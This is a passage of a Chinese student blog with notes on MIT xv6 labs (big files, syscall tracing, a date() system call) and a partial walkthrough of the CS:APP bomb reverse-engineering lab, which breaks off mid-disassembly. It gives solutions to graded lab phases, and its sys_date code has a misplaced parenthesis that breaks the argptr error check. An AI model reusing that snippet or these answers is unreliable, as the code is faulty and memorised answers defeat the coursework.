<p>除此之外, <code>log_write()</code>函数的作用可能是记录文件的变更, <code>brelse()</code>估计是类似析构函数的释放地址空间的作用.</p>
<p>别忘了在 fs.h 中修改几个常量的值.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">~~~</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NDIRECT 11</span></span><br><span class="line">~~~</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXFILE (NDIRECT + NINDIRECT + NINDIRECT*NINDIRECT )</span></span><br><span class="line">~~~</span><br><span class="line">uint addrs[NDIRECT+<span class="number">2</span>];   <span class="comment">// Data block addresses</span></span><br></pre></td></tr></table></figure>

<p>修改好这两个文件后, 重新编译<code>make qemu</code>.</p>
<p>输入big命令, 得到如下结果即为成功.</p>
<figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/xv6.png" alt title class>
                <p></p>
            </figure>

<p>总的来说算是一次简单的实验了…</p>
<p>完.</p>
<h3 id="xv6-system-calls"><a href="#xv6-system-calls" class="headerlink" title="xv6 system calls"></a>xv6 system calls</h3><p><a href="https://pdos.csail.mit.edu/6.828/2018/homework/xv6-syscall.html" target="_blank" rel="noopener">MIT作业要求</a></p>
<ul>
<li>实验目的 : 增加一个新的系统调用函数 <code>date()</code></li>
</ul>
<h4 id="显示系统调用"><a href="#显示系统调用" class="headerlink" title="显示系统调用"></a>显示系统调用</h4><p>根据提示, 找到 <code>syscall.c</code> 中的 <code>syscall()</code>函数.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">syscall(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> num;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">curproc</span> = <span class="title">myproc</span>();</span></span><br><span class="line"></span><br><span class="line">  num = curproc-&gt;tf-&gt;eax;</span><br><span class="line">  <span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><br><span class="line">    <span class="comment">// 这里通过 syscall.h 中的宏定义实现由 num 到相应系统调用的映射.</span></span><br><span class="line">    curproc-&gt;tf-&gt;eax = syscalls[num]();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    cprintf(<span class="string">"%d %s: unknown sys call %d\n"</span>,</span><br><span class="line">            curproc-&gt;pid, curproc-&gt;name, num);</span><br><span class="line">    curproc-&gt;tf-&gt;eax = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要想在系统调用时打印相关信息, 也模仿 else 中的语句就可以.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个char* 数组</span></span><br><span class="line"><span class="keyword">char</span>* syscallName[] = &#123;</span><br><span class="line">  <span class="string">"null"</span>,</span><br><span class="line">  <span class="string">"fork"</span>,</span><br><span class="line">  <span class="string">"exit"</span>,</span><br><span class="line">  <span class="string">"wait"</span>,</span><br><span class="line">  <span class="string">"pipe"</span>,</span><br><span class="line">  <span class="string">"read"</span>,</span><br><span class="line">  <span class="string">"kill"</span>,</span><br><span class="line">  <span class="string">"exec"</span>,</span><br><span class="line">  <span class="string">"fstat"</span>,</span><br><span class="line">  <span class="string">"chdir"</span>,</span><br><span class="line">  <span class="string">"dup"</span>,</span><br><span class="line">  <span class="string">"getpid"</span>,</span><br><span class="line">  <span class="string">"sbrk"</span>,</span><br><span class="line">  <span class="string">"sleep"</span>,</span><br><span class="line">  <span class="string">"uptime"</span>,</span><br><span class="line">  <span class="string">"open"</span>,</span><br><span class="line">  <span class="string">"write"</span>,</span><br><span class="line">  <span class="string">"mknod"</span>,</span><br><span class="line">  <span class="string">"unlink"</span>,</span><br><span class="line">  <span class="string">"link"</span>,</span><br><span class="line">  <span class="string">"mkdir"</span>,</span><br><span class="line">  <span class="string">"close"</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><br><span class="line">    <span class="comment">// 这里通过 syscall.h 中的宏定义实现由 num 到相应系统调用的映射.</span></span><br><span class="line">    cprintf(<span class="string">"%s -&gt; %d\n"</span>,syscallName[num],num);</span><br><span class="line">    curproc-&gt;tf-&gt;eax = syscalls[num]();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/syscall.png" alt title class>
                <p></p>
            </figure>

<p>如图应该是成功了, 但我不知道为啥和MIT里的编号不同. </p>
<h4 id="Date-system-call"><a href="#Date-system-call" class="headerlink" title="Date system call"></a>Date system call</h4><p>下一步就该建立我们的<code>date()</code>函数了.</p>
<p>使用命令找出需要修改的几个地方:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:~/yjn/xv6-public$ grep -n uptime *.[chS]</span><br><span class="line">syscall.c:106:extern int sys_uptime(void);</span><br><span class="line">syscall.c:125:  <span class="string">"uptime"</span>,</span><br><span class="line">syscall.c:150:[SYS_uptime]  sys_uptime,</span><br><span class="line">syscall.h:15:<span class="comment">#define SYS_uptime 14</span></span><br><span class="line">sysproc.c:83:sys_uptime(void)</span><br><span class="line">user.h:25:int uptime(void);</span><br><span class="line">usys.S:31:SYSCALL(uptime)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>syscall.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">sys_date</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面是简略写法:</span></span><br><span class="line"><span class="keyword">char</span>* syscallName[] :</span><br><span class="line">  <span class="string">"date"</span></span><br><span class="line"><span class="comment">// 下面是简略写法:</span></span><br><span class="line">static int (*syscalls[])(void) :</span><br><span class="line">  [SYS_date]    sys_date</span><br></pre></td></tr></table></figure>
</li>
<li><p>syscall.h</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYS_date   22</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>sysproc.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> </span><br><span class="line">sys_date(<span class="keyword">void</span>)&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rtcdate</span> *<span class="title">r</span>;</span></span><br><span class="line">  <span class="keyword">if</span>(argptr(<span class="number">0</span>, (<span class="keyword">void</span>*)&amp;r, <span class="keyword">sizeof</span>(*r) &lt; <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>; </span><br><span class="line">  cmostime(r);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>user.h</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">date</span><span class="params">(struct rtcdate*)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>usys.S</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL(date)</span><br><span class="line">``` </span><br><span class="line">还有需要一个程序来调用`date()`以验证效果.</span><br><span class="line">+ date.c</span><br><span class="line">```c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"types.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"user.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"date.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rtcdate</span> <span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (date(&amp;r)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="number">2</span>, <span class="string">"date failed\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// your code to print the time in any format you like...</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="number">1</span>, <span class="string">"%d/%d/%d-%d:%d:%d"</span>,r.year, r.month, r.day, r.hour, r.minute, r.second);</span><br><span class="line">  <span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>最后不要忘了在<code>Makefile</code>里加上 date 这个程序.</p>
<p>效果: <figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/date.png" alt title class>
                <p></p>
            </figure></p>
<h2 id="计算机组成原理"><a href="#计算机组成原理" class="headerlink" title="计算机组成原理"></a>计算机组成原理</h2><h3 id="bomb-从零开始的汇编世界之旅"><a href="#bomb-从零开始的汇编世界之旅" class="headerlink" title="bomb(从零开始的汇编世界之旅)"></a>bomb(从零开始的汇编世界之旅)</h3><p>这个实验我 tm 吹爆. </p>
<p>我有预感, 这会是我迈入 <code>reverse</code> 和 <code>pwn</code> 的第一个阶梯.</p>
<ul>
<li>实验简介 : 给你一个<a href="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/bomb" target="_blank" rel="noopener">bomb程序</a>, 需要你连续输入六个密码才能阻止引爆. 你需要做的就是通过反编译这个程序破译出6个密码.</li>
</ul>
<p>同时, 题目也给出了main函数的代码, 让玩家可以对整体的框架有个了解.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *input;</span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">1</span>) &#123;  </span><br><span class="line">	    infile = <span class="built_in">stdin</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (argc == <span class="number">2</span>) &#123;</span><br><span class="line">  	  <span class="keyword">if</span> (!(infile = fopen(argv[<span class="number">1</span>], <span class="string">"r"</span>))) &#123;</span><br><span class="line">	      <span class="built_in">printf</span>(<span class="string">"%s: Error: Couldn't open %s\n"</span>, argv[<span class="number">0</span>], argv[<span class="number">1</span>]);</span><br><span class="line">	      <span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">  	  &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">"Usage: %s [&lt;input_file&gt;]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">	    <span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    initialize_bomb();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome to my fiendish little bomb. You have 6 phases with\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"which to blow yourself up. Have a nice day!\n"</span>);</span><br><span class="line">    input = read_line();           </span><br><span class="line">    phase_1(input);                  </span><br><span class="line">    phase_defused();             </span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Phase 1 defused. How about the next one?\n"</span>);</span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_2(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"That's number 2.  Keep going!\n"</span>);</span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_3(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Halfway there!\n"</span>);</span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_4(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"So you got that one.  Try this one.\n"</span>);</span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_5(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Good work!  On to the next...\n"</span>);</span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_6(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过<code>main.c</code>我们可以知道所有关于密码正确与否都是在phase函数中完成的.</p>
<h4 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h4><p>最简单的一关, 有无数种方法可以搞定.</p>
<ul>
<li>IDA<br>IDA 静态分析神器的大名早有耳闻, 所以第一时间就想到了使用 IDA. </li>
</ul>
<p>不出我所料, 反编译后发现就是把我们输入的密码<code>input</code>与代码中的一段字符串常量进行了比较. 非常轻松.</p>
<figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/1.png" alt title class>
                <p></p>
            </figure>

<p>由于IDA不是本次实验的重点, 就不在此重点展开了.</p>
<p>重点是使用 <code>gdb</code> 调试器的方法来获取 <code>password</code></p>
<ul>
<li>gdb</li>
</ul>
<p>由于一开始没有找到中意的图形化界面调试器, 我在 <code>YW 大佬</code> 的推荐下使用了<code>pwndbg</code> 这个工具, 确实很强大, 而且和 <code>gdb</code>的使用方法基本相同. </p>
<p><img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/2.png" alt></p>
<p>因为密码的判断在<code>phase_2</code>中, 我就先调试这段代码. 密码什么的先随便输一个.</p>
<p>进入后最显眼的还是<code>strings_not_equal</code>这个函数. (因为整个屏幕就这里有人话……)</p>
<figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/3.png" alt title class>
                <p></p>
            </figure>

<p>调用函数后, 汇编代码是如何实现输错密码就爆炸, 输对不爆炸的呢?</p>
<p>调用<code>strings_not_equals</code>后, 其返回值会保存在寄存器 <code>$eax</code> 中.</p>
<p>下面的指令 <code>test</code> 会让两个操作数做与运算, 但是结果并不保存在寄存器或是内存中, 而是发送到 flag寄存器 中的某个标志位(大概记得是第6位, 记不清了).</p>
<p>再下面一行的 <code>je</code> 就会读取该标志位, 如果为零就跳转, 否则不跳转. 可是在这里一旦不跳转而是继续顺序执行, 就会调用 <code>explode_bomb</code>, 程序会不可逆的走向终止.</p>
<p>也就是为了不让炸弹启动, 一定要保证<code>strings_not_equal</code>返回 0 才可以, 这也就是密码的由来.</p>
<h4 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h4><p>从第二题开始就增加难度了, 经过漫长的尝试, 我终于搞出了密码.</p>
<p>进入<code>phase_2</code>, 首先被调用的函数就是<code>read_six_numbers</code>. </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">000000000040145c &lt;read_six_numbers&gt;:</span><br><span class="line">  40145c:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  401460:	48 89 f2             	mov    %rsi,%rdx</span><br><span class="line">  401463:	48 8d 4e 04          	lea    0x4(%rsi),%rcx</span><br><span class="line">  401467:	48 8d 46 14          	lea    0x14(%rsi),%rax</span><br><span class="line">  40146b:	48 89 44 24 08       	mov    %rax,0x8(%rsp)</span><br><span class="line">  401470:	48 8d 46 10          	lea    0x10(%rsi),%rax</span><br><span class="line">  401474:	48 89 04 24          	mov    %rax,(%rsp)</span><br><span class="line">  401478:	4c 8d 4e 0c          	lea    0xc(%rsi),%r9</span><br><span class="line">  40147c:	4c 8d 46 08          	lea    0x8(%rsi),%r8</span><br><span class="line">  401480:	be c3 25 40 00       	mov    $0x4025c3,%esi</span><br><span class="line">  401485:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  40148a:	e8 61 f7 ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  40148f:	83 f8 05             	cmp    $0x5,%eax</span><br><span class="line">  401492:	7f 05                	jg     401499 &lt;read_six_numbers+0x3d&gt;</span><br><span class="line">  401494:	e8 a1 ff ff ff       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401499:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  40149d:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p>我这里遇到的第一个问题就是搞不懂<code>&lt;__isoc99_sscanf@plt&gt;</code>的作用, 当时十分迷惑为啥进入了<code>phase_2</code>后还要继续输入, 但其实不是这么回事, 这个函数在这里是格式化字符串的作用.</p>
<p>举个例子:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>( dtm, <span class="string">"Saturday March 25 1989"</span> );</span><br><span class="line"><span class="built_in">sscanf</span>( dtm, <span class="string">"%s %s %d  %d"</span>, weekday, month, &amp;day, &amp;year )</span><br><span class="line"><span class="comment">//=&gt; weekday = Saturday, month = March, day = 25, year = 1989</span></span><br></pre></td></tr></table></figure>

<p>当我们调用<code>&lt;__isoc99_sscanf@plt&gt;</code>时, 传入的参数为:</p>
<figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/5.png" alt title class>
                <p></p>
            </figure>

<p>可以看到这里的前两个参数就对应着C语言中的代码. 最后函数会将字符串中的 6 个整数提取出来(恐怕这也是这段函数名为<code>read_six_numbers</code>的原因)</p>
<p>从<code>sscanf</code>返回后, <code>$eax</code>中保存着提取的整数个数, 紧接着会进行比较是否大于5, 如果不是就会触发炸弹.</p>
<p>从<code>read_six_numbers</code>返回到<code>phase_2</code>后, 会进入密码的验证阶段.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:	55                   	push   %rbp</span><br><span class="line">  400efd:	53                   	push   %rbx</span><br><span class="line">  400efe:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  400f02:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">  400f05:	e8 52 05 00 00       	callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">    #### 程序从这里返回</span><br><span class="line">  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)</span><br><span class="line">  400f0e:	74 20                	je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f10:	e8 25 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:	eb 19                	jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax</span><br><span class="line">  400f1a:	01 c0                	add    %eax,%eax</span><br><span class="line">  400f1c:	39 03                	cmp    %eax,(%rbx)</span><br><span class="line">  400f1e:	74 05                	je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">  400f20:	e8 15 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:	48 83 c3 04          	add    $0x4,%rbx</span><br><span class="line">  400f29:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">  400f2c:	75 e9                	jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:	eb 0c                	jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx</span><br><span class="line">  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp</span><br><span class="line">  400f3a:	eb db                	jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  400f40:	5b                   	pop    %rbx</span><br><span class="line">  400f41:	5d                   	pop    %rbp</span><br><span class="line">  400f42:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p><code>cmpl   $0x1,(%rsp)</code> , 在调试器中跟进很容易发现这里是把我们输入的第一个整数和1比较, 得出第一个数字是 1. 如果这里正确的话, 会跳转至<code>400f30</code>, 随后进入一段迭代.</p>
<p>仔细分析迭代的代码, 会发现每次决定我们生死的指令为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax</span><br><span class="line">400f1a:	01 c0                	add    %eax,%eax</span><br><span class="line">400f1c:	39 03                	cmp    %eax,(%rbx)</span><br></pre></td></tr></table></figure>

<p>通过跟进调试器, 这段迭会通过<code>$rbx</code>和<code>$rbp</code>两个寄存器组成一对上下标来访问访问处于栈中的我们的6个整数, 并且在每轮迭代使寄存器<code>$eax</code>的值等于上个整数的值再×2. 那么为了每次的判断为真, 需要前后两个整数差一倍, 规律就出来了, 即 1, 2 ,4 ,8, 16, 32.</p>
<h4 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h4><p>这道题先看<code>phase_3</code>的前几行汇编.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  400f56:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400f5b:	e8 90 fc ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:	83 f8 01             	cmp    $0x1,%eax</span><br><span class="line">  400f63:	7f 05                	jg     400f6a &lt;phase_3+0x27&gt;</span><br><span class="line">  400f65:	e8 d0 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)</span><br><span class="line">  400f6f:	77 3c                	ja     400fad &lt;phase_3+0x6a&gt;</span><br></pre></td></tr></table></figure>

<p>这里也有<code>isoc99_sscanf</code>, 通过查看常量和使用调试器跟进, 发现是读取两个整数.</p>
<p>从<code>sscanf</code>返回回来后, <code>$eax</code>与常量 1 比较, 可知至少要输入 2 个数字.</p>
<p><code>cmpl   $0x7,0x8(%rsp)</code> 可知输入的第一个数要小于等于7.</p>
<p>然后会进入一个<code>switch</code>的环节.</p>
<figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/6.png" alt title class>
                <p></p>
            </figure>

<p><code>400f75:    ff 24 c5 70 24 40 00     jmpq   *0x402470(,%rax,8)</code></p>
<p>跳转地址的公式为 : <code>0x402470 + ($rax * 8)</code> 就形成了一个类似<code>switch case</code>的功能. <code>$rax</code>在这里存放的是我输入的第一个数字.</p>
<p>我在这里遇到的一个问题是, 在通过调试器跟进时, 发现哪条指令都没对<code>$rax</code>进行操作, 莫名其妙的最后就成了我输入的第一个数字. 后来才知道<code>rax(64位)</code>和<code>eax(32位)</code>是共享32位的, 对<code>eax</code>的操作约等于<code>rax</code>(不溢出的前提下).</p>
<p>进入<code>swtich</code>后, 程序会对 <code>eax</code> 再赋某一个常量, 最后再把它和我们输入的第二个数比较, 相等就成了. 所以这道题的答案不唯一, 只要进到的分支能和最后的输入匹配上就好了. </p>
<h4 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h4><p>先看汇编代码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">000000000040100c &lt;phase_4&gt;:</span><br><span class="line">  40100c:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  401010:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  401015:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  40101a:	be cf 25 40 00       	mov    